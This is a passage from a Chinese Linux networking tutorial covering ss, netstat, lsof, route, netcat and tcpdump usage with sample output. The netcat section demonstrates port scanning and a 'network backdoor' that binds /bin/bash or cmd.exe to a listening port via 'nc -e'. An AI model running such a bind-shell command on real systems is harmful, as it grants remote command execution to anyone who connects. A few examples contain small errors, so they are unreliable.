<h3 id="显示ipv6或ipv4-连接">显示ipv6或ipv4 连接<a hidden class="anchor" aria-hidden="true" href="#显示ipv6或ipv4-连接">¶</a></h3>
<pre><code class="language-bash">ss -4
ss -6
</code></pre>
<h3 id="筛选连接">筛选连接<a hidden class="anchor" aria-hidden="true" href="#筛选连接">¶</a></h3>
<p>语法</p>
<pre><code class="language-bash">ss [ OPTIONS ] [ STATE-FILTER ] [ ADDRESS-FILTER ]
</code></pre>
<p>ss命令还提供了筛选方法，过滤套接字端口或地址。例如，要显示具有ssh服务的源端口与目标端口（即监听与客户端连接）。</p>
<pre><code> ss -at '( dport = :22 or sport = :22 )'
</code></pre>
<p>也可以通过服务名称进行过滤</p>
<pre><code class="language-bash">ss -at '( dport = :ssh or sport = :ssh )'
</code></pre>
<p>仅显示所有处于 <code>established</code> 状态的Ipv4 tcp套接字。</p>
<pre><code class="language-bash">ss -t4 state established -n

Recv-Q Send-Q   Local Address:Port    Peer Address:Port   
0      0        172.16.0.2:22         61.50.248.5:22005   
0      0        172.16.0.2:42930      169.254.0.55:5574    
0      0        172.16.0.2:22         61.50.248.5:22008   
0      0        172.16.0.2:22         61.50.248.5:22003   
0      0        172.16.0.2:40652      94.130.12.30:443     
0      36       172.16.0.2:22         61.50.248.5:22012   
0      0        172.16.0.2:22         61.50.248.5:22004   
</code></pre>
<p>列出状态为time wait的套接字</p>
<pre><code class="language-bash">ss -t4 state time-wait -n
</code></pre>
<p>这里状态可以为下面的任意一种</p>
<blockquote>
<ul>
<li>established</li>
<li>syn-sent</li>
<li>syn-recv</li>
<li>fin-wait-1</li>
<li>fin-wait-2</li>
<li>time-wait</li>
<li>closed</li>
<li>close-wait</li>
<li>last-ack</li>
<li>closing</li>
<li>all  上面所有状态</li>
<li>connected  除listen和closed之外的所有状态</li>
<li>synchronized  除syn-sent之外的所有连接状态</li>
<li>显示状态，这些被维护为mini sockets，即 <code>time-wait </code> 与 <code>syn-recv</code></li>
<li>big 与bucket选项相反</li>
</ul>
</blockquote>
<p>过滤地址</p>
<pre><code class="language-bash">ss -nt dst 74.125.236.178
</code></pre>
<p>还可以过滤网段</p>
<pre><code class="language-bash">ss -nt dst 74.125.236.178/16
</code></pre>
<p>ip和端口的组合</p>
<pre><code class="language-bash">ss -nt dst 74.125.236.178:80
</code></pre>
<p>源地址为127.0.0.1，且源端口大于5000</p>
<pre><code class="language-bash">ss -nt src 127.0.0.1 sport gt :5000
</code></pre>
<p>源端口为25的smtp套接字</p>
<pre><code class="language-bash">ss -ntlp sport eq :smtp
</code></pre>
<p>端口号大于25</p>
<pre><code class="language-bash">ss -nt sport gt :1024
</code></pre>
<p>远程端口小于100的套接字</p>
<pre><code class="language-bash">ss -nt dport \&lt; :100
</code></pre>
<p>连接到远程80端口的</p>
<pre><code class="language-bash">ss -nt state connected dport = :80
</code></pre>
<h3 id="不解析主机名">不解析主机名<a hidden class="anchor" aria-hidden="true" href="#不解析主机名">¶</a></h3>
<p>可以通过 <code>-n</code> 选项阻止ss 将ip解析为主机名，来达到更快地获得输出，但这也无法进行到端口号的解析。</p>
<pre><code class="language-bash">ss -at '( dport = :22 or sport = :22 )'

State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port                
LISTEN     0      128             *:ssh                     *:*                    
ESTAB      0      0          172.16.0.2:ssh           111.206.214.55:49374                
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost005          
ESTAB      0      36         172.16.0.2:ssh           61.50.248.5:22008                
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost003          
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost004          
LISTEN     0      128            [::]:ssh                 [::]:*                    


ss -at '( dport = :22 or sport = :22 )' -n
State      Recv-Q Send-Q   Local Address:Port         Peer Address:Port              
LISTEN     0      128           *:22                    *:*                  
ESTAB      0      0        172.16.0.2:22              111.206.214.55:49374              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22005              
ESTAB      0      36       172.16.0.2:22              61.50.248.5:22008              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22003              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22004              
LISTEN     0      128            [::]:22                    [::]:*      
</code></pre>
<h3 id="仅显示监听套接字">仅显示监听套接字<a hidden class="anchor" aria-hidden="true" href="#仅显示监听套接字">¶</a></h3>
<pre><code class="language-bash">ss -ltn
</code></pre>
<p>要列出所有侦听的udp连接，请将t替换为u</p>
<pre><code class="language-bash">ss -lun
</code></pre>
<h3 id="显示时间信息">显示时间信息<a hidden class="anchor" aria-hidden="true" href="#显示时间信息">¶</a></h3>
<p>可以使用 <code>-o</code> 选项，来获得每个连接的时间信息。通过timer得知</p>
<pre><code class="language-bash">ss -tn -o

State      Recv-Q Send-Q     Local Address:Port    Peer Address:Port              
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22005   timer:(keepalive,40min,0)
ESTAB      0      0          172.16.0.2:42930      169.254.0.55:5574               
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22008   timer:(keepalive,64min,0)
ESTAB      0      0          172.16.0.2:44900      169.254.0.55:80     timer:(keepalive,13sec,0)
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22003   timer:(keepalive,40min,0)
ESTAB      0      36         172.16.0.2:22         61.50.248.5:22012   timer:(on,347ms,0)
ESTAB      0      0          172.16.0.2:39316      94.130.12.30:443    timer:(keepalive,50sec,0)
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22004   timer:(keepalive,40min,0)
</code></pre>
<h3 id="netstat">netstat<a hidden class="anchor" aria-hidden="true" href="#netstat">¶</a></h3>
<p><em><strong>netstat</strong></em> (network statistics) 命令行工具，用于监视传入和传出的网络连接，以及查看路由表、接口统计等。netstat在所有类似Unix的操作系统上都可用，在Windows操作系统上也可用，是最基本的网络服务调试工具。</p>
<p>不过，现在<code>netstat</code> 命令早已被弃用，取而代之的是 <code>iproute</code> 套件中的 <code>ss</code>。ss 比起 <code>netstat</code>，<code>ss</code> 能够显示有关网络连接的详细信息，并且速度更快。<code>netstat</code> 从 <code>/proc</code> 文件收集信息，当有大量连接要打印时，<code>netstat</code> 效率很低。而<code>ss</code> 是直接从内核空间获取信息。并且<code>ss</code>命令在使用起来与<code>netstat </code>非常相似，用户几乎可以无缝切换。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>
<p><strong>ss</strong></p>
</li>
<li>
<p>Ubuntu/Debian:  <code>iproute2</code>   ；<code>apt install iproute2</code></p>
</li>
<li>
<p>CentOS/Fedora: <code>iproute</code>  ；<code>yum install -y iproute</code></p>
</li>
<li>
<p>Apline：<code>iproute</code> ；<code>apk add --no-cache iproute</code></p>
</li>
<li>
<p><strong>netstat</strong></p>
</li>
<li>
<p>Ubuntu/Debian:  <code>net-tools</code>   ；<code>apt install net-tools</code></p>
</li>
<li>
<p>CentOS/Fedora: <code>net-tools</code>  ；<code>yum install -y net-tools</code></p>
</li>
<li>
<p>Apline：<code>net-tools</code> ；<code>apk add --no-cache net-tools</code></p>
</li>
</ul>
</blockquote>
<ul>
<li>列出所有tcp与udp的连接的所有端口 <code>netstat -a</code></li>
<li>仅列出tcp (<strong>Transmission Control Protocol</strong>)  端口的连接 <code>netstat -at</code></li>
<li>仅列出udp (<strong>User Datagram Protocol</strong> )   端口的连接 <code>netstat -au</code></li>
<li>列出所有活动监听端口连接 <code>netstat -l</code></li>
<li>列出TCP监听端口 <code>netstat -lt</code></li>
<li>列出udp监听端口 <code>netstat -lu</code></li>
<li>列出unix socket 监听端口 <code>netstat -lx</code></li>
<li>显示统计信息 <code>netstat -s</code></li>
<li>显示tcp的统计信息 <code>netstat -st</code></li>
<li>显示udp的统计信息 <code>netstat -su</code></li>
<li>显示服务名与PID号 <code>netstat -tp</code></li>
<li>显示混杂模式，类似<code>watch</code> 每5s 刷新 <code>netstat -ac 5 | grep tcp</code></li>
<li>显示内核路由表，类似<code> route -n</code> 命令；<code>netstat -r</code></li>
<li>显示网络接口数据包事务，包括传输和接收MTU大小的数据包。 <code>netstat -i</code></li>
<li>显示内核接口表，类似 <code>ifconfig</code> 命令。 <code>netstat -ie</code></li>
<li>显示IPv4和IPv6的广播信息。<code>netstat -g</code></li>
<li>混杂模式，间隔时间打印netstat命令的信息 <code>netstat -c [second] -ltnp</code></li>
<li>显示原始网络信息统计 <code>netstat --statistics --raw</code></li>
</ul>
<h2 id="lsof">lsof<a hidden class="anchor" aria-hidden="true" href="#lsof">¶</a></h2>
<p><em><strong>lsof</strong></em> (LiSt Open Files)，主要用来找出哪个进程打开了哪些文件。众所周知，Linux是一个基于文件的操作系统（管道、套接字、目录、设备等）。使用lsof也可以排查一些网络问题。如未关闭的文件不能被移动或删除，网络端口使用的文件等，都可以通过lsof快速定位。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>lsof</code>  ；<code>apt install lsof</code></li>
<li>CentOS/Fedora: <code>lsof</code> ；<code>yum install -y lsof</code></li>
<li>Apline：<code>lsof </code> ；<code>apk add lsof --no-cache</code></li>
</ul>
</blockquote>
<h3 id="列出所有打开的文件">列出所有打开的文件<a hidden class="anchor" aria-hidden="true" href="#列出所有打开的文件">¶</a></h3>
<p>不带任何参数的情况下运行lsof，可以列出所有打开的文件</p>
<pre><code class="language-bash">lsof
</code></pre>
<h3 id="列出用户进程使用的文件">列出用户进程使用的文件<a hidden class="anchor" aria-hidden="true" href="#列出用户进程使用的文件">¶</a></h3>
<p>lsof 可以查看特定用户进程使用的哪些文件，使用<code>-u</code></p>
<pre><code class="language-bash">lsof -u root
</code></pre>
<h3 id="根据网络地址查找文件">根据网络地址查找文件<a hidden class="anchor" aria-hidden="true" href="#根据网络地址查找文件">¶</a></h3>
<pre><code class="language-bash">lsof -i 4
</code></pre>
<h3 id="按照程序名称列出所打卡的文件">按照程序名称列出所打卡的文件<a hidden class="anchor" aria-hidden="true" href="#按照程序名称列出所打卡的文件">¶</a></h3>
<p>这里不必使用完整的程序名，会列出所有以 name开头的进程应用使用的文件</p>
<pre><code class="language-bash">lsof -u nginx
</code></pre>
<h3 id="列出进程使用的文件">列出进程使用的文件<a hidden class="anchor" aria-hidden="true" href="#列出进程使用的文件">¶</a></h3>
<p>使用 <code>-p [pid]</code> k可以显示进程打开的文件，可以通过 <code>^</code> 来排除特定的PID。</p>
<pre><code class="language-bash">lsof -p [pid]
lsof -p [^pid]
</code></pre>
<h3 id="找到使用文件的进程">找到使用文件的进程<a hidden class="anchor" aria-hidden="true" href="#找到使用文件的进程">¶</a></h3>
<p>使用 <code>-t</code> 餐食可以找到哪些进程使用了该文件</p>
<pre><code class="language-bash">lsof -t [file_name]
</code></pre>
<h3 id="列出目录中所有打开的文件">列出目录中所有打开的文件<a hidden class="anchor" aria-hidden="true" href="#列出目录中所有打开的文件">¶</a></h3>
<p><code>+D</code> 餐食可以对目录的所有打开实例（包括它包含的所有文件和目录）进行搜索。</p>
<pre><code class="language-bash">lsof +D [dir]
</code></pre>
<h3 id="列出网络文件">列出网络文件<a hidden class="anchor" aria-hidden="true" href="#列出网络文件">¶</a></h3>
<p><code>-i</code> 侦听特定端口号的进程或应用程序，如检查了哪个程序进程正在使用端口80。</p>
<pre><code class="language-bash">lsof -i:80  
</code></pre>
<p>还可以根据端口范围进程查找</p>
<pre><code class="language-bash">lsof -i:1-1024
</code></pre>
<h3 id="根据网络连接类型来查找文件">根据网络连接类型来查找文件<a hidden class="anchor" aria-hidden="true" href="#根据网络连接类型来查找文件">¶</a></h3>
<p>lsof还可以根据连接的类型列出文件。例如，TCP使用的文件</p>
<pre><code class="language-bash">lsof -i tcp
</code></pre>
<h3 id="拿到进程的父进程id">拿到进程的父进程ID<a hidden class="anchor" aria-hidden="true" href="#拿到进程的父进程id">¶</a></h3>
<p><code>lsof -R</code> 可以拿到进程的父进程IP输出中列出父进程标识（PPID Parent Process IDentification）。</p>
<pre><code class="language-bash">lsof -p [] -R
</code></pre>
<h3 id="查看用户的网络连接">查看用户的网络连接<a hidden class="anchor" aria-hidden="true" href="#查看用户的网络连接">¶</a></h3>
<p>结合使用 <code>-i</code> 和 <code>-u</code> 命令行选项，我们可以搜索Linux用户的所有网络连接。可以按照需要检查一个被黑客攻击的系统，如我们检查用户root的所有网络活动：</p>
<pre><code class="language-bash">lsof -a -i -u root
</code></pre>
<h3 id="列出所有内存映射文件">列出所有内存映射文件<a hidden class="anchor" aria-hidden="true" href="#列出所有内存映射文件">¶</a></h3>
<pre><code class="language-bash">lsof -d mem
</code></pre>
<h2 id="route">route<a hidden class="anchor" aria-hidden="true" href="#route">¶</a></h2>
<p>在Linux中，route命令用于处理IP/内核路由表。主要用于通过网络接口建立到主机/IP的静态路由。它用于显示或更新IP/内核路由表。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>net-tools</code>  ；<code>apt install net-tools</code></li>
<li>CentOS/Fedora: <code>net-tools</code> ；<code>yum install -y net-tools</code></li>
<li>Apline：<code>net-tools </code> ；<code>apk add net-tools --no-cache</code></li>
</ul>
</blockquote>
<p>route命令不加任何参数，默认情况下将显示内核路由表条目的详细信息。当包在这个路由IP范围内发送时，通过ARP协议找到目的地的MAC地址，包将被发送到MAC地址。</p>
<p>当在路由条目中找不到对应的路由信息，数据包将被转发到默认网关，该网关决定该数据包的进一步路由。</p>
<p>route命令不加参数，会在输出时显示为主机名，这时解析会影响性能。可以使用 <code>-n</code> 选项请求不显示主机名。</p>
<pre><code class="language-bash">route -n
</code></pre>
<h3 id="添加默认网关">添加默认网关<a hidden class="anchor" aria-hidden="true" href="#添加默认网关">¶</a></h3>
<p>可以使用 <code>route add</code> 命令添加一个默认网关。</p>
<pre><code class="language-bash">route add default gw 10.0.0.1
</code></pre>
<h3 id="添加一条路由">添加一条路由<a hidden class="anchor" aria-hidden="true" href="#添加一条路由">¶</a></h3>
<p>这里添加一条，将通过10.0.0.0/24的流量由eth0设备通过 添加一条路由，如下所示。</p>
<pre><code class="language-bash">route add -net 10.0.0.0 netmask 255.255.255.0 dev eth0
</code></pre>
<p>-net 目标网络</p>
<p>dev 将规则和设备关联在一起</p>
<p><strong>添加一个目标主机</strong></p>
<pre><code class="language-bash">route add -host 12.123.0.10 gw 192.168.1.1 enp0s3
</code></pre>
<h3 id="列出内核路由表信息">列出内核路由表信息<a hidden class="anchor" aria-hidden="true" href="#列出内核路由表信息">¶</a></h3>
<p>内核维护了路由缓存以更快地路由数据包。可以使用 <code>-C</code> 来打印内核的路由缓存信息。</p>
<pre><code class="language-bash">route -Cn

Kernel IP routing cache
Source          Destination     Gateway         Flags Metric Ref    Use Iface
10.0.0.4        10.0.0.1        10.0.0.1              0      1        0 eth0
10.0.0.1        10.0.0.4        10.0.0.4        il    0      0       44 lo
10.0.0.1        10.0.0.255      10.0.0.255      ibl   0      0        7 lo
</code></pre>
<h3 id="拒绝路由到特定的主机">拒绝路由到特定的主机<a hidden class="anchor" aria-hidden="true" href="#拒绝路由到特定的主机">¶</a></h3>
<p>有些场景下，可能需要拒绝数据包路由到特定的主机/网络。</p>
<pre><code class="language-bash">route add -host 192.168.1.51 reject
</code></pre>
<p>可以看到路由已经不会路由该流量了</p>
<pre><code class="language-bash">ping 10.0.0.2
connect: No route to host
</code></pre>
<p>如果需要拒绝整个网络可以这样</p>
<pre><code class="language-bash">route add -net 192.168.1.0 netmask 255.255.255.0 reject
</code></pre>
<h3 id="删除一条路由">删除一条路由<a hidden class="anchor" aria-hidden="true" href="#删除一条路由">¶</a></h3>
<pre><code># 删除默认路由
route del default
# 删除刚才添加的拒绝路由
route del -host 10.0.0.2 reject
</code></pre>
<h2 id="ncat--netcatnc--nmap">ncat &amp; netcat(nc) &amp; nmap<a hidden class="anchor" aria-hidden="true" href="#ncat--netcatnc--nmap">¶</a></h2>
<p>netcat（简称nc）是一款功能强大的网络命令行工具，用于在Linux中执行与TCP、UDP或UNIX域套接字相关的任何操作。netcat可以用于端口扫描、端口重定向，作为端口监听器（用于传入连接）；它还可以用来打开远程连接和其他许多事情。此外，还可以将其用作访问目标服务器的后门。netcat还因此被称为TCP/IP的“瑞士军刀”。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>netcat</code>   ；<code>apt install netcat</code></li>
<li>CentOS/Fedora: <code>nc</code>  ；<code>yum install -y nc</code></li>
<li>Apline：<code>netcat-openbsd</code> ；<code>apk add --no-cache netcat-openbsd</code></li>
</ul>
</blockquote>
<h3 id="端口扫描-1">端口扫描<a hidden class="anchor" aria-hidden="true" href="#端口扫描-1">¶</a></h3>
<p>netcat可以用于端口扫描：了解哪些端口是开放的，并且在目标机器上运行服务。它可以扫描单一或多个开防的端口。如示例，<code>-z</code> 选项将nc设置为只扫描监听守护进程，而不实际向它们发送任何数据。<code>-v</code> 选项启用详细模式，<code>-w</code> 为无法建立连接时超时时间。</p>
<pre><code class="language-bash">nc -v -w 10 -z 195.133.11.43 22

Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 195.133.11.43:22.
Ncat: 0 bytes sent, 0 bytes received in 0.25 seconds.
</code></pre>
<p>也可以扫描一个范围</p>
<pre><code class="language-bash">nc -v -n -z -w 1 127.0.0.1 1-1000
</code></pre>
<h3 id="在服务器间传送文件">在服务器间传送文件<a hidden class="anchor" aria-hidden="true" href="#在服务器间传送文件">¶</a></h3>
<p>netcat可以在两台服务器之间传输文件，这两个系统都必须安装nc。例如，要将ISO映像文件从一台计算机复制到另一台计算机并监视传输进度（使用pv），请在发送方/接收端上运行以下命令。</p>
<p>将以<code>netcat</code> 的监听模式 <code>-l</code>。</p>
<pre><code class="language-bash">tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso  | pv | nc -l -p 3000 -q 5
</code></pre>
<p>在接受端运行命令</p>
<pre><code class="language-bash">nc 192.168.1.4 3000 | pv | tar -zxf -
</code></pre>
<h3 id="使用netcat实现一个命令行聊天服务器">使用netcat实现一个命令行聊天服务器<a hidden class="anchor" aria-hidden="true" href="#使用netcat实现一个命令行聊天服务器">¶</a></h3>
<p>可以使 <code>netcat</code> 创建一个简单的命令行消息服务器，前提条件是nc必须安装在两个系统上。在服务端，运行命令来创建监听端口5555的聊天服务器。</p>
<pre><code class="language-bash">nc -l -vv -p 5000
</code></pre>
<p>在客户端上，运行命令连接到服务端进行聊天会话。</p>
<pre><code class="language-bash">nc {ip} 5000
</code></pre>
<h3 id="使用nc创建一个web服务器">使用nc创建一个web服务器<a hidden class="anchor" aria-hidden="true" href="#使用nc创建一个web服务器">¶</a></h3>
<p>使用nc <code>-l</code> 选项可以创建一个基础的不安全的web服务器，需要一个静态html文件。然后可以通过 <code>while</code> 保持netcat命令不退出。正常情况下，netcat在连接断开时退出。</p>
<pre><code class="language-bash">while : ; do ( echo -ne &quot;HTTP/1.1 200 OK\r\n&quot; ; cat 1.html; ) | nc -l -p 8080 ; done
</code></pre>
<pre><code>$ while : ; do ( echo -ne &quot;HTTP/1.1 200 OK\r\n&quot; ; cat 1.html; ) | nc -l -p 8080 ; done
GET / HTTP/1.1
Host: ip:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
</code></pre>
<h3 id="网络故障排查">网络故障排查<a hidden class="anchor" aria-hidden="true" href="#网络故障排查">¶</a></h3>
<p>netcat 主要常用的一个方面时排查网络连接故障，可以使用 <code>netcat</code> 来验证服务器正在发送哪些数据以响应客户端发出的命令。</p>
<p>使用命令的可以输出包括web服务器发送的标头，这些标头可用于故障排除。也可以使用 <code>curl</code> 等命令进行同样的操作。</p>
<pre><code class="language-bash">printf &quot;GET / HTTP/1.0\r\n\r\n&quot; | nc baidu.com 80

HTTP/1.1 200 OK
Date: Mon, 28 Jun 2021 12:16:55 GMT
Server: Apache
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
ETag: &quot;51-47cf7e6ee8400&quot;
Accept-Ranges: bytes
Content-Length: 81
Cache-Control: max-age=86400
Expires: Tue, 29 Jun 2021 12:16:55 GMT
Connection: Close
Content-Type: text/html

&lt;html&gt;
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.baidu.com/&quot;&gt;
&lt;/html&gt;
</code></pre>
<h3 id="查找端口上运行的服务">查找端口上运行的服务<a hidden class="anchor" aria-hidden="true" href="#查找端口上运行的服务">¶</a></h3>
<p>使用 <code>netcat</code> 可以获取服务监听端口的信息，单一般情况下，仅常见公共服务会这样，一些服务并不会相应对应的应用名称。。<code>-n</code> 标志表示禁用DNS或服务查找。</p>
<pre><code class="language-bash">nc -v -n 195.133.11.43 22
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 195.133.11.43:22.
SSH-2.0-OpenSSH_7.4
</code></pre>
<h3 id="网络后门-1">网络后门<a hidden class="anchor" aria-hidden="true" href="#网络后门-1">¶</a></h3>
<p>一般情况下，黑客将 <code>netcat</code> 当作网络后门来运行，通过反弹式shell以获取远程命令。要充当后门。<code>-e</code>  在目标系统上运行的命令。</p>
<p>如监听一个端口，并将所有传入的输入传递给bash命令，结果将传送于客户端。</p>
<pre><code># linux
nc -l -p -v 3001  -e /bin/bash

# windows
nc -l -p 3001  -e cmd.exe
</code></pre>
<h3 id="检查一个udp端口">检查一个udp端口<a hidden class="anchor" aria-hidden="true" href="#检查一个udp端口">¶</a></h3>
<p><code>-z</code>：无法进行<code>I/O</code> ，仅报告连接状态</p>
<p><code>-u</code>：使用udp协议</p>
<pre><code class="language-bash">nc -vz -u 
</code></pre>
<h2 id="tcpdump-supa-href11asup">tcpdump <sup><a href="#1">[1]</a></sup><a hidden class="anchor" aria-hidden="true" href="#tcpdump-supa-href11asup">¶</a></h2>
<p>tcpdump网络嗅探器，将强大和简单结合到一个单一的命令行界面中，能够将网络中的报文抓取，输出到屏幕或者记录到文件中。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>tcpdump</code> ；<code>apt-get install -y tcpdump</code></li>
<li>CentOS/Fedora: <code>tcpdump</code> ；<code>yum install -y tcpdump</code></li>
<li>Apline：<code>tcpdump </code> ；<code>apk add tcpdump --no-cache</code></li>
</ul>
</blockquote>
<p>查看指定接口上的所有通讯</p>
<p>语法</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i [interface]  </td>
<td>接口名</td>
</tr>
<tr>
<td>-p</td>
<td><code>--no-promiscuous-mode</code> 抓包内容为非混杂模式下的包</td>
</tr>
<tr>
<td>-w [flle]</td>
<td>保存原始的包到文件中</td>
</tr>
<tr>
<td>-n</td>
<td>不转换IP为DNS名称</td>
</tr>
<tr>
<td>-N</td>
<td>将端口解析为数字格式而不是服务名</td>
</tr>
<tr>
<td>-A</td>
<td>以 <em><strong>ASCII</strong></em> 格式打印内容（不包含标头）</td>
</tr>
<tr>
<td>-XX</td>
<td>打印数据为==数据包的标头==与以十六进制和 <em><strong>ASCII</strong></em> 格式打印数据包的数据。</td>
</tr>
<tr>
<td>-v/-vv/-vvv</td>
<td>详细信息；<code>-v</code>, <code>-vv</code> 将打印更多信息</td>
</tr>
<tr>
<td>-r</td>
<td>读取文件而不是实时抓包</td>
</tr>
</tbody>
</table>
<p><strong>关键字</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>关键字</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>type</strong></td>
<td><code>host</code>, <code>net</code>, <code>port</code>, <code>portrange</code></td>
</tr>
<tr>
<td><strong>direction</strong></td>
<td><code>src</code>, <code>dst</code>, <code>src or dst</code> , <code>src and ds</code></td>
</tr>
<tr>
<td><strong>protocol</strong></td>
<td><code>ether</code>, <code>ip</code>, <code>arp</code>, <code>tcp</code>, <code>udp</code>, <code>wlan</code></td>
</tr>
</tbody>
</table>
<h3 id="捕获所有网络接口">捕获所有网络接口<a hidden class="anchor" aria-hidden="true" href="#捕获所有网络接口">¶</a></h3>
<pre><code class="language-bash">tcpdump -D
</code></pre>
<h3 id="按ip查找流量">按IP查找流量<a hidden class="anchor" aria-hidden="true" href="#按ip查找流量">¶</a></h3>
<p>最常见的查询之一 <code>host</code>，可以看到来往于 <code>1.1.1.1</code> 的流量。</p>
<pre><code class="language-bash">tcpdump host 1.1.1.1
</code></pre>
<h3 id="按源目的-地址过滤">按源/目的 地址过滤<a hidden class="anchor" aria-hidden="true" href="#按源目的-地址过滤">¶</a></h3>
<p>如果只想查看来自/向某方向流量，可以使用 <code>src</code> 和 <code>dst</code>。</p>
<pre><code class="language-bash">tcpdump src|dst 1.1.1.1
</code></pre>
<h3 id="通过网络查找数据包">通过网络查找数据包<a hidden class="anchor" aria-hidden="true" href="#通过网络查找数据包">¶</a></h3>
<p>使用 <code>net</code> 选项，来要查找出/入某个网络或子网的数据包。</p>
<pre><code class="language-bash">tcpdump net 1.2.3.0/24
</code></pre>
<h3 id="使用十六进制输出数据包内容">使用十六进制输出数据包内容<a hidden class="anchor" aria-hidden="true" href="#使用十六进制输出数据包内容">¶</a></h3>
<p><code>hex</code> 可以以16进制输出包的内容</p>
<pre><code class="language-bash">tcpdump -c 1 -X icmp
</code></pre>
<h3 id="查看特定端口的流量">查看特定端口的流量<a hidden class="anchor" aria-hidden="true" href="#查看特定端口的流量">¶</a></h3>
<p>使用 <code>port</code> 选项来查找特定的端口流量。</p>
<pre><code class="language-bash">tcpdump port 3389
tcpdump src port 1025
</code></pre>
<h3 id="查找端口范围的流量">查找端口范围的流量<a hidden class="anchor" aria-hidden="true" href="#查找端口范围的流量">¶</a></h3>
<pre><code class="language-bash">tcpdump portrange 21-23
</code></pre>
<h3 id="过滤包的大小">过滤包的大小<a hidden class="anchor" aria-hidden="true" href="#过滤包的大小">¶</a></h3>
<p>如果需要查找特定大小的数据包，可以使用以下选项。你可以使用 <code>less</code>，<code>greater</code>。</p>
<pre><code class="language-bash">tcpdump less 32
tcpdump greater 64
tcpdump &lt;= 128
</code></pre>
<h3 id="捕获流量输出为文件">捕获流量输出为文件<a hidden class="anchor" aria-hidden="true" href="#捕获流量输出为文件">¶</a></h3>
<p><code>-w</code>  可以将数据包捕获保存到一个文件中以便将来进行分析。这些文件称为<code>PCAP</code>（PEE-cap）文件，它们可以由不同的工具处理，包括 <code>Wireshark</code> 。</p>
<pre><code class="language-bash">tcpdump port 80 -w capture_file
</code></pre>
<h3 id="组合条件">组合条件<a hidden class="anchor" aria-hidden="true" href="#组合条件">¶</a></h3>
<p>tcpdump也可以结合逻辑运算符进行组合条件查询</p>
<ul>
<li>
<p><strong>AND</strong>
<em><code>and</code></em> or <code>&amp;&amp;</code></p>
</li>
<li>
<p><strong>OR</strong>
<em><code>or</code></em> or <code>||</code></p>
</li>
<li>
<p><strong>EXCEPT</strong>
<em><code>not</code></em> or <code>!</code></p>
</li>
</ul>
<pre><code class="language-bash">tcpdump -i eth0 -nn host 220.181.57.216 and 10.0.0.1  # 主机之间的通讯
tcpdump -i eth0 -nn host 220.181.57.216 or 10.0.0.1
# 获取10.0.0.1与 10.0.0.9或 10.0.0.1 与10.0.0.3之间的通讯
tcpdump -i eth0 -nn host 10.0.0.1 and \(10.0.0.9 or 10.0.0.3\)
</code></pre>
<h3 id="原始输出">原始输出<a hidden class="anchor" aria-hidden="true" href="#原始输出">¶</a></h3>
<p>并显示人类可读的内容进行输出包（不包含内容）。</p>
<pre><code class="language-tcpdump">tcpdump -ttnnvvS -i eth0 
</code></pre>
<h3 id="ip到端口">IP到端口<a hidden class="anchor" aria-hidden="true" href="#ip到端口">¶</a></h3>
<p>让我们查找从某个IP到端口任何主机的某个端口所有流量。</p>
<pre><code class="language-bash">tcpdump -nnvvS src 10.5.2.3 and dst port 3389
</code></pre>
<h3 id="去除特定流量">去除特定流量<a hidden class="anchor" aria-hidden="true" href="#去除特定流量">¶</a></h3>
<p>可以将指定的流量排除，如这显示所有到192.168.0.2的 非ICMP的流量。</p>
<pre><code class="language-bash">tcpdump dst 192.168.0.2 and src net and not icmp
</code></pre>
<p>来自非指定端口的流量，如，显示来自不是SSH流量的主机的所有流量。</p>
<pre><code class="language-bash">tcpdump -vv src mars and not dst port 22
</code></pre>
<h3 id="选项分组">选项分组<a hidden class="anchor" aria-hidden="true" href="#选项分组">¶</a></h3>
<p>在构建复杂查询时，必须使用单引号 <code>'</code>。单引号用于忽略特殊符号 <code>()</code> ，以便于使用其他表达式（如host, port, net等）进行分组。</p>
<pre><code class="language-###">tcpdump 'src 10.0.2.4 and (dst port 3389 or 22)'
</code></pre>
<h3 id="过滤tcp标记位">过滤TCP标记位<a hidden class="anchor" aria-hidden="true" href="#过滤tcp标记位">¶</a></h3>
<p>TCP RST</p>
<p>The filters below find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on.</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 4!=0'
tcpdump 'tcp[tcpflags] == tcp-rst'
</code></pre>
<p>TCP SYN</p>
<pre><code class="language-bash">tcpdump 'tcp[13] &amp; 2!=0'
tcpdump 'tcp[tcpflags] == tcp-syn'
</code></pre>
<p>同时忽略SYN和ACK标志的数据包</p>
